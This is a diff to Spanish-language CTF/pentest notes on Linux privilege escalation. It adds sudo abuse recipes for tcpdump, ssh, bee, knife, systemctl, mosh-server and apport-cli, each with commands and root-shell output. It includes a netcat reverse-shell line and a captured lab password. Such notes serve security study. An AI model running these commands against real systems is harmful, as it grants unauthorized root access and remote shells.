@@ -280,7 +280,9 @@ En este caso hay una página web en la máquina la cual podremos visualizar por 
 
 ### Sudo
 
-Una manera de escalar privilegios es a través del siguiente comando:
+Es posible asignar privilegios sudo a una cuenta para permitir la ejecución de comandos específicos con privilegios de root (u otro usuario), sin necesidad de cambiar de sesión ni conceder acceso total al sistema. Al ejecutar un comando con sudo, el sistema valida si el usuario tiene los permisos correspondientes según la configuración definida en el archivo /etc/sudoers. En algunos casos, será necesario ingresar la contraseña del usuario para listar estos permisos. 
+
+Al acceder a un sistema, siempre es recomendable comprobar si el usuario actual posee privilegios sudo ejecutando el siguiente comando:
 
 ```bash
 ┌─[user@user]─[/]
@@ -321,7 +323,7 @@ int main() {
 }
 ```
 
-Y lo compilamos y movemos en la carpeta de tools en caso sea necesario, para posteriormente ejecutarlo:
+Lo compilamos y movemos a la carpeta de tools en caso sea necesario, para posteriormente ejecutarlo:
 
 ```bash
 ┌─[user@user]─[/tools]
@@ -339,23 +341,271 @@ easysysinfo  easysysinfo.py  test.c
 root
 ```
 
-Y finalmente obtenemos acceso como usuario root, por lo que el programa funciona correctamente.
+Finalmente obtenemos acceso como usuario root, por lo que el programa funciona correctamente.
 
-### Find para CTF
+Otros casos son los siguientes:
 
-En las competencias Capture The Flag (CTF) de seguridad informática, el tiempo suele ser un factor crítico. Si tienes permiso para ejecutar ```find``` con ```sudo```, entonces podrás buscar a través de sistemas de archivos y también ejecutar comandos sobre los archivos encontrados. A continuación se presentan opciones de uso:
-
-```bash
-┌─[user@user]─[/]
-└──╼ find / -name "root.txt"
-```
+#### Permiso sudo en tcpdump
 
 ```bash
 ┌─[user@user]─[/]
-└──╼ find . -name "root.txt"
+└──╼ sudo -l
+
+Matching Defaults entries for sysadm on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sysadm may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/sbin/tcpdump
 ```
 
-Una vez encontrado, con el comando ```cat``` y la ubicación del archivo root.txt, podremos visualizarlo.
+El atacante puede crear un script de shell oculto (/tmp/.test) que contenga una shell inversa y ejecutarlo de la siguiente forma:
+
+```
+┌─[user@user]─[/]
+└──╼ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+```
+
+Primero, se crea el archivo que será ejecutado como postrotate-command, agregando una línea simple de shell inversa:
+
+```
+┌─[user@user]─[/]
+└──╼ cat /tmp/.test
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4646 >/tmp/f
+```
+
+A continuación, se inicia un listener de Netcat en la máquina atacante y se ejecuta tcpdump con privilegios de root, especificando el script malicioso como comando post-rotación:
+
+```
+┌─[user@user]─[/]
+└──╼  sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+┌─[user@user]─[/]
+└──╼  nc -lnvp 4646
+listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
+bash: cannot set terminal process group (10797): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@NIX02:~# id && hostname               
+id && hostname
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Permiso sudo en SSH
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+[sudo] password for josh: manchesterunited
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+```
+┌─[user@user]─[/]
+└──╼ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# whoami
+root
+```
+
+#### Permiso sudo en bee
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+[sudo] password for user: 
+Matching Defaults entries for user on pc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on pc:
+    (ALL : ALL) /usr/local/bin/bee
+```
+
+**Opción 1**.
+
+```
+┌─[user@user]─[/]
+└──╼ sudo /usr/local/bin/bee eval "system('/bin/bash');"
+```
+
+**Opción 2**.
+
+```
+┌─[user@user]─[/]
+└──╼ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
+```
+
+#### Permiso sudo en knife
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+```
+
+```
+┌─[user@user]─[/]
+└──╼ sudo knife exec -E 'exec "/bin/sh"'
+# whoami
+root
+```
+
+#### Permiso sudo en systemctl
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+sudo -l
+Matching Defaults entries for user on user:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on user:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+
+```
+┌─[user@user]─[/]
+└──╼ sudo /usr/bin/systemctl status trail.service
+sudo /usr/bin/systemctl status trail.service
+WARNING: terminal is not fully functional
+-  (press RETURN)!sh
+# whoami
+whoami
+root
+```
+
+> Se usa tras ejecutar systemctl !sh
+
+#### Permiso sudo en mosh-server
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+
+```
+
+```
+┌─[user@user]─[/]
+└──╼ mosh --server="sudo /usr/bin/mosh-server" localhost
+The authenticity of host 'localhost (<no hostip for proxy command>)' can't be established.
+ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
+Warning: SSH_CONNECTION not found; binding to any interface.
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Mon Dec 22 02:27:04 AM UTC 2025
+
+  System load:  0.0               Processes:             234
+  Usage of /:   63.6% of 6.56GB   Users logged in:       1
+  Memory usage: 31%               IPv4 address for eth0: 10.10.11.48
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@underpass:~# whoami
+root
+```
+
+#### Permiso sudo en apport-cli
+
+```
+┌─[user@user]─[/]
+└──╼ sudo -l
+[sudo] password for logan: 
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+```
+
+Dado que se necesita contar con un archivo de crasheo como condición para explotar esta vulnerabilidad, provocamos un segmentation fault simple. Esto crashea tu shell actual.
+
+```
+┌─[user@user]─[/var/crash]
+└──╼ ls -al
+total 512
+drwxrwxrwt  2 root  root    4096 Dec 16 05:57 .
+drwxr-xr-x 13 root  root    4096 Sep 12  2023 ..
+
+┌─[user@user]─[/var/crash]
+└──╼ kill -SEGV $$
+Connection to 10.10.11.242 closed.
+```
+
+Al volver a ingresar nuevamente por ejemplo por SSH obtenemos el archivo .crash que necesitamos.
+
+```
+┌─[user@user]─[/var/crash]
+└──╼ ls -al
+total 512
+drwxrwxrwt  2 root  root    4096 Dec 16 05:57 .
+drwxr-xr-x 13 root  root    4096 Sep 12  2023 ..
+-rw-r-----  1 logan logan 515902 Dec 16 05:57 _usr_bin_bash.1000.crash
+```
+
+Ejecutamos ```!/bin/bash``` al finalizar el informe de error. 
+
+```
+┌─[user@user]─[/var/crash]
+└──╼ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash
+[sudo] password for logan: 
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (515.6 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+............................................................................................................................................................................................................................................................................................................................................
+...........................................................................................................................ERROR: Cannot update /var/crash/_usr_bin_bash.1000.crash: [Errno 13] Permission denied: '/var/crash/_usr_bin_bash.1000.crash'
+..............:!/bin/bash
+
+root@logan:/var/crash# cd /root
+root@logan:~# whoami
+root
+```
 
 ### SUID
 
@@ -422,7 +672,7 @@ En el caso de que ```find``` no se encuentra disponible se puede aplicar el sigu
 
 A continuación se presentan distintas formas de uso:
 
-#### apt-get
+#### Permiso SUID en apt-get 
 
 ```
 ┌─[user@user]─[/]
@@ -432,7 +682,7 @@ A continuación se presentan distintas formas de uso:
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-#### Enlightenment
+#### Permiso SUID en Enlightenment
 
 Para este caso hay una vulnerabilidad de escalada de privilegios conocida como CVE-2022-37706 el cual aprovecha la función de biblioteca del sistema dado que maneja incorrectamente las rutas que comienzan con una subcadena /dev/. El siguiente exploit muestra la vulnerabilidad:
 
@@ -505,7 +755,7 @@ mount: /dev/../tmp/: can't find in /etc/fstab.
 root 
 ```
 
-#### Passwd
+#### Permiso SUID en Passwd
 
 Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:
 
